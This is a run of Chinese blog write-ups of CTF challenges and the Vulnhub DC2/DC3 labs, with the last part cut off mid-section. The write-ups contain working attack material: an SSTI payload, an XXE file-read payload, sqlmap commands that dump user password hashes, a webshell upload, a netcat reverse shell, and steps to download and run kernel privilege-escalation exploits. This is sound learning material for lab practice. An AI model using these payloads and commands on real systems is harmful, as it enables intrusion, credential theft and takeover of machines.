/flasklight/coomme_geeeett_youur_flek&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里的话我都是直接拿存着的模板去打，当然也可以按照步骤一步一步来打</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>题目</p><p>查看源码发现了<code>check.php</code>，然后访问得到一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个考点的话之前做过了，现在在重温一便</p><p>就是说只要<code>mt_srand(seed)</code>的<code>seed</code>固定，那么就可以得到随机数的值</p><p>所以说我们得使用工具来通过爆破随机数的值来爆破出种子，从而得到接下来随机数的值</p><p><strong>然后写个脚本把给的前十位字符串转化为工具能识别出来的</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;rlD3S0vhc3&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">// 前两个<span class="built_in">str</span>(j)代表第一个mt_rand()输出的界限，后两个参数<span class="number">0</span>和<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)表示传递到 mt_rand()的范围为<span class="number">0</span>到<span class="number">61</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17 17 0 61 11 11 0 61 39 39 0 61 29 29 0 61 54 54 0 61 26 26 0 61 21 21 0 61 7 7 0 61 2 2 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>seed爆破工具</p><p><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker</a></p><p><img src="../images/image-20230413202206497.png" alt="image-20230413202206497"></p><p>拿到种子</p><p><img src="../images/image-20230413202345933.png" alt="image-20230413202345933"></p><p><img src="../images/image-20230413202336046.png" alt="image-20230413202336046"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>题目</p><p><img src="../images/image-20230413202626327.png" alt="image-20230413202626327"></p><p>这种题目有好多地方都是考点</p><p>于是就一个一个的进行尝试</p><p>最后发现这里考察的是  <strong>文件上传</strong></p><p><img src="../images/image-20230413203203320.png" alt="image-20230413203203320"></p><p>这个函数应该很熟悉了吧，就是判断文件头是否为图片类型</p><p>那我先传入一个图片马，上传成功。但是发现无论是.htaccess，还是各种格式的都无法上传成功，图片马也无法利用。</p><p>这时猜测是否能通过web应用程序解析漏洞绕过。报错网页，发现是apache</p><p><img src="../images/image-20230413204301391.png" alt="image-20230413204301391"></p><p>随便输入点东西让他报错     发现是apache的</p><p><strong>由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，jpg等扩展名是apache不能识别的</strong></p><p>这里的话可以看看这篇文章  <a href="https://www.freebuf.com/vuls/335282.html">apache中间件漏洞解析总结</a></p><p><strong>但是这里又无法上传成功，很奇怪。这里测试了一会，发现反着利用就可以了，上传1.jpg.php</strong></p><p><strong>看图片链接，发现上传路径/uploads。然后最奇特的一点，jpg好像被过滤成空了，直接是php文件了。那就直接利用。蚁剑连接，在根目录下找到flag</strong></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>题目</p><p><img src="../images/image-20230413205529469.png" alt="image-20230413205529469"></p><p>和之前show的题目很像，都是长这样的</p><p><img src="../images/image-20230413210616742.png" alt="image-20230413210616742"></p><p>抓包判断出这是考察的<code>XXE</code></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [&lt;!ENTITY goodies SYSTEM &quot;file:///proc/net/arp&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里的话直接读flag是读不出来的</p><p><strong>但是XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测。</strong></p><ul><li>/etc/hosts 储存域名解析的缓存</li><li>/etc/passwd 用户密码</li><li>/proc/net/arp 每个网络接口的arp表中dev包</li></ul><p><strong>/proc/net/arp</strong>    可以直接查看内网ip</p><p><img src="../images/image-20230413212725585.png" alt="image-20230413212725585"></p><p>于是就开始爆破内网IP，就是扫c段，然后就可以发现flag了</p><p>匹配到正确的ip就能发现flag</p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>题目</p><p>报错注入</p><p><a href="https://www.cnblogs.com/gaonuoqi/p/12621382.html">wp</a></p><p>这里话是话就是通过修改密码处会进行报错提示</p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>题目</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GYCTF2020-FlaskApp&quot;&gt;&lt;a href=&quot;#GYCTF2020-FlaskApp&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]FlaskApp&quot;&gt;&lt;/a&gt;[GYCTF2020]FlaskApp&lt;/h2&gt;&lt;p&gt;题目&lt;/</summary>
      
    
    
    
    
    <category term="buuctf 刷题记录 第三页" scheme="https://ke1nys.github.io/tags/buuctf-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AC%AC%E4%B8%89%E9%A1%B5/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub DC3</title>
    <link href="https://ke1nys.github.io/posts/a127ea96.html"/>
    <id>https://ke1nys.github.io/posts/a127ea96.html</id>
    <published>2023-04-09T13:51:21.000Z</published>
    <updated>2023-04-11T01:44:26.491Z</updated>
    
    <content type="html"><![CDATA[<p>考点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总结：joomscan工具的使用，cve-2016-4557内核提权或者cve-2021-4034内核提权</span><br></pre></td></tr></table></figure><p>现扫一下看开放了哪些端口</p><p><img src="../images/image-20230410221753236.png" alt="image-20230410221753236"></p><p>只开放了一个80端口</p><p>看起来像是个网页，然后进行访问</p><p><img src="../images/image-20230410221926196.png" alt="image-20230410221926196"></p><p>发现这是一个cms框架</p><p>于是就用到了这个工具来查看这个网站是否存在漏洞</p><p><strong>Joomla!</strong>是一套全球知名的内容管理系统，Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统。</p><p><strong>这里需要使用一个工具joomscan 因为最新kali没有 又去装了一下又学习了一下。</strong></p><p>（JoomScan）：是一个开源项目，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。该工具在Perl中实现，可以无缝轻松地扫描Joomla安装，同时通过其轻量级和模块化架构留下最小的占地面积。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷，这些缺陷可被攻击者利用来破坏系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rezasp/joomscan.git </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd joomscan</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410223514173.png" alt="image-20230410223514173"></p><p>一些最基本的参数 使用命令：<code>perl joomscan.pl --url 192.168.142.130</code></p><p><img src="../images/image-20230410223612886.png" alt="image-20230410223612886"></p><p>发现漏洞</p><p>通过上面的 探测我们可以知道<code>Joomla</code> 的版本 <code>3.7.0</code> 以及CMS的后台地址<code>/administrator/</code> (说明工具还是强大的，爆赞👍)并且还没开防火墙</p><p>这里知道版本号就尝试查找这个版本的漏洞</p><p><a href="https://xz.aliyun.com/t/2860">记一次在实战靶机中使用SearchSploit的总结</a></p><p>就是利用这个工具来进行查找(kali自带)</p><p>msf也能查询到，但是不知道能不能进行利用</p><p><img src="../images/image-20230410224100325.png" alt="image-20230410224100325"></p><p>存在sql注入 </p><p>那么我们就进行漏洞利用   <strong>后面的path有利用方法</strong></p><p> 那么我们就进行访问那个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/42033.txt j.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410224524420.png" alt="image-20230410224524420"></p><p>就直接用sqlmap来打</p><p><img src="../images/image-20230410224900307.png" alt="image-20230410224900307"></p><p><strong>查询到好几个数据库</strong></p><p><strong>接下来就是查找当前网站用的数据库是哪个</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225107342.png" alt="image-20230410225107342"></p><p><strong>接下来就是查表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225206881.png" alt="image-20230410225206881"></p><p>查出来一堆表</p><p>这里的话就注重查询<strong>#__users</strong></p><p>注入查询<strong>#__users</strong>表 发现有6列 知道列了就可以进行下一步字段的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225524368.png" alt="image-20230410225524368"></p><p>发现存在用户名和密码</p><p>然后进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225648646.png" alt="image-20230410225648646"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin</span><br><span class="line">password：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure><p>发现密码进行了加密(还是使用之前用的<strong>john</strong>进行破解)</p><p><img src="../images/image-20230410225935194.png" alt="image-20230410225935194"></p><p>爆破出密码 ——-&gt;  <code>snoopy</code></p><p>然后根据之前查出来的后台登录就行</p><p><img src="../images/image-20230410230119518.png" alt="image-20230410230119518"></p><p><img src="../images/image-20230410230145831.png" alt="image-20230410230145831"></p><p>登录成功</p><p>成功登录进去后，我们开始寻找可以利用的点，最终我们在templates下面找到一个可以创建文件并且可以写文件的地方。于是，尝试写入一句话木马</p><p><img src="../images/image-20230410231044168.png" alt="image-20230410231044168"></p><p>这里就是一个漏洞利用点</p><p><img src="../images/image-20230410231254633.png" alt="image-20230410231254633"></p><p>写进来后我们就得去找上传地址了</p><p><img src="../images/image-20230410231346635.png" alt="image-20230410231346635"></p><p>根据这两条猜出来的结论</p><p><img src="../images/image-20230410231557812.png" alt="image-20230410231557812"></p><p>成功执行，代表上传成功</p><p><img src="../images/image-20230411085918600.png" alt="image-20230411085918600"></p><p>成功连上蚁剑</p><p><img src="../images/image-20230411090020317.png" alt="image-20230411090020317"></p><p>查看虚拟终端发现不是root权限，所以我们就尝试一下进行提权</p><p>尝试了一圈发现suid和sudo用不了来进行提权，那么我们就得尝试别的方法了</p><p><strong>这里话蚁剑不适合提权，也不好进行操作</strong>，我们就尝试弹个shell回到本机</p><p>（首先需要明确，不能使用蚁剑提权，因为HTTP是瞬时协议，我这边正提权呢，你那边TCP四次挥手断开连接了，不能持久连接，所以蚁剑的作用就在于上传文件来反弹shell。)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.142.129 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>这个是php的反弹shell操作</p><p><img src="../images/image-20230411090508994.png" alt="image-20230411090508994"></p><p>反弹shell成功</p><p>接下来整一个python交互的shell好进行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411090616944.png" alt="image-20230411090616944"></p><p>设置成功</p><p>这里由于前两个点提权不成功，那么我们就尝试进行内核提权</p><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p><a href="https://juejin.cn/post/7164665837511507999">LINUX提权之内核漏洞提权篇</a></p><p>先进行内核的查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411091229892.png" alt="image-20230411091229892"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a      # 查看发行版本</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411091330803.png" alt="image-20230411091330803"></p><p><code> </code></p><p>于是就使用searchsploit</p><p><img src="../images/image-20230411091513906.png" alt="image-20230411091513906"></p><p>这两个玩意确实存在漏洞</p><h4 id="cve-2016-4557"><a href="#cve-2016-4557" class="headerlink" title="cve-2016-4557"></a>cve-2016-4557</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspolit -x linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411094349657.png" alt="image-20230411092545805"></p><p>还会把CVE告诉你</p><p>于是访问这个本地的这个完整地址</p><p><img src="../images/image-20230411092823114.png" alt="image-20230411092823114"></p><p>发现给了一个exp下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//将exp下载过来</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br><span class="line"> </span><br><span class="line">//解压</span><br><span class="line">unzip 39772.zip</span><br><span class="line"> </span><br><span class="line">//进去到39772目录</span><br><span class="line">cd 39*</span><br><span class="line"> </span><br><span class="line">//解压exploit.tar</span><br><span class="line">tar -xvf ex*</span><br><span class="line"> </span><br><span class="line">//到ebpf_mapfd_doubleput_exploit目录中</span><br><span class="line">cd eb*</span><br><span class="line"> </span><br><span class="line">//运行compile.sh文件</span><br><span class="line">./compile.sh</span><br><span class="line"> </span><br><span class="line">//运行生成的文件doubleput</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411093124013.png" alt="image-20230411093124013"></p><p><strong>这就是利用内核提权</strong></p><p><img src="../images/image-20230411093211569.png" alt="image-20230411093211569"></p><h4 id="cve-2021-4034"><a href="#cve-2021-4034" class="headerlink" title="cve-2021-4034"></a>cve-2021-4034</h4><p><a href="https://www.iceswordlab.com/2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>   这篇文章也可以进行利用</p><p><img src="../images/image-20230411093533747.png" alt="image-20230411093533747"></p><p>测试环境，比上面的环境还要新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//使用git命令将exp复制到靶机中</span><br><span class="line">git clone https://github.com/arthepsy/CVE-2021-4034</span><br><span class="line"> </span><br><span class="line">//来到CVE-2021-4034目录</span><br><span class="line">cd CVE*</span><br><span class="line"> </span><br><span class="line">//编译cve-2021-4034-poc.c</span><br><span class="line">gcc cve* -o cve-2021-4034</span><br><span class="line"> </span><br><span class="line">//运行cve-2021-4034</span><br><span class="line">./cve-2021-4034</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><p>学到了几个工具的使用</p><p><strong>joomscan —-&gt;  针对joom的cms的</strong></p><p><strong>searchspolit  ——-&gt;    查找exp的  例如cms  内核版本</strong>   </p><p><strong>john  ———&gt;    爆破加密密码</strong></p><p><strong>sqlmap   就是经常用的工具了</strong>  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;考点&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;</summary>
      
    
    
    
    
    <category term="vulnhub DC3" scheme="https://ke1nys.github.io/tags/vulnhub-DC3/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub DC2</title>
    <link href="https://ke1nys.github.io/posts/d620da00.html"/>
    <id>https://ke1nys.github.io/posts/d620da00.html</id>
    <published>2023-04-09T12:31:29.000Z</published>
    <updated>2023-04-12T06:57:38.278Z</updated>
    
    <content type="html"><![CDATA[<p><strong>总结:cewl和wpscan的使用，rbash逃逸，suid<a href="https://so.csdn.net/so/search?q=提权&amp;spm=1001.2101.3001.7020">提权</a></strong></p><p>cewl  ——&gt;   密码生成工具</p><p>wpscan  —-&gt;  爆破用户名</p><p><a href="https://www.freebuf.com/sectool/174663.html">WPScan使用完整攻略：如何对Wordpress站点进行安全测试</a></p><p><img src="../images/image-20230409204637751.png" alt="image-20230409204637751"></p><p>还是现扫下c段看下靶机ip</p><p><img src="../images/image-20230409203330539.png" alt="image-20230409203330539"></p><p>猜一下是131，或者用和DC1说的那种关靶机的方法也行</p><p><img src="../images/image-20230409203510524.png" alt="image-20230409203510524"></p><p>靶机开了两个端口</p><p><img src="../images/image-20230409203649238.png" alt="image-20230409203649238"></p><p>发现重定向到一个域名，这里和htb里的一道题一样，得修改hosts</p><p><strong>就是dns域名解析有关</strong></p><p><img src="../images/image-20230409203850335.png" alt="image-20230409203850335"></p><p>修改好后再次进行访问</p><p><img src="../images/image-20230409203912792.png" alt="image-20230409203912792"></p><p>成功进行访问</p><p><img src="../images/image-20230409203935440.png" alt="image-20230409203935440"></p><p>这次是使用了wordpress框架</p><p><img src="../images/image-20230409204105356.png" alt="image-20230409204105356"></p><p>找到了flag1</p><p>并且给了提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">您通常的单词列表可能不起作用，所以相反，也许您只需要 cewl。</span><br><span class="line"></span><br><span class="line">更多密码总是更好，但有时您无法赢得所有密码。</span><br><span class="line"></span><br><span class="line">以一个人身份登录以查看下一个标志。</span><br><span class="line"></span><br><span class="line">如果找不到，请以另一个身份登录。</span><br></pre></td></tr></table></figure><p>这里就提示了使用<strong>cewl</strong>(一个字典生成工具)</p><p><a href="https://www.codercto.com/a/44828.html">cewl的详细使用教学</a></p><p>通过他的提示，也该不止有一个用户</p><p>所以我们就得使用工具爆破出这个网站的所有用户</p><p>那么既然我们有了密码 我们还需要知道用户名使用<strong>wpscan</strong> 这个工具  针对wordpress框架使用的</p><p>使用命令：<code>wpscan --url http://dc-2/ -e</code></p><p><img src="../images/image-20230409205001726.png" alt="image-20230409205001726"></p><p>扫到了三个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w pass.txt 然后就去参考别的人的了</span><br><span class="line">wpscan --url http://dc-2/ -e //枚举用户名</span><br><span class="line">echo &quot;admin\njerry\ntom\n&quot; &gt; user.txt //将枚举到的三个用户，添加到user.txt中</span><br><span class="line">wpscan --url http://dc-2 user.txt -P pass.txt //然后爆破账号密码</span><br></pre></td></tr></table></figure><p>爆破出来密码了   接下来就是登录后台了</p><p><img src="../images/image-20230409210248545.png" alt="image-20230409210248545"></p><p>admin没爆破出来</p><p>所以我们开始扫网站的目录</p><p><img src="../images/image-20230409210736812.png" alt="image-20230409210736812"></p><p>用其他扫目录工具也行，扫出来一个后台</p><p><img src="../images/image-20230409210819324.png" alt="image-20230409210819324"></p><p>重定向到了一个登录框，那么我们就拿之前爆破出来的账号密码进行登录</p><p><img src="../images/image-20230409210935313.png" alt="image-20230409210935313"></p><p>成功登录后台</p><p><img src="../images/image-20230409211115820.png" alt="image-20230409211115820"></p><p>找到了flag2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果您不能利用 WordPress 并走捷径，还有另一种方法。</span><br><span class="line">（就是不能利用exp）</span><br><span class="line">希望你找到了另一个切入点。</span><br></pre></td></tr></table></figure><p>也尝试<code>tom</code>账户 发现并没有什么可用的信息，那么我们之前扫出来的开启ssh端口就派上用场了</p><p><img src="../images/image-20230409211423049.png" alt="image-20230409211423049"></p><p>真的登录成功了</p><p><img src="../images/image-20230409211507283.png" alt="image-20230409211507283"></p><p>但是出现了一个特殊情况就是命令没有被找到</p><p>爆了一个   <strong>-rbash的玩意</strong></p><p><a href="https://cloud.tencent.com/developer/article/1680551">rbash绕过</a></p><p>那么我们尝试进行编辑查看，看行不行(就是使用vim)</p><p><img src="../images/image-20230409211629232.png" alt="image-20230409211629232"></p><p>发现可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可怜的老汤姆总是追着杰瑞。也许他应该为他造成的所有压力而苏。</span><br></pre></td></tr></table></figure><p>根据这个内容切换成jerry账户一下</p><p>所以猜想这里的提示应该是想我们切换到jerry用户，而不是重新ssh登录到jerry用户</p><p>然后发现密码不对，所以就还是好好研究一下怎么绕过<strong>rbash</strong>吧</p><p><strong>tips</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//方法1</span><br><span class="line">vi a //随便一个文件</span><br><span class="line">shift+;  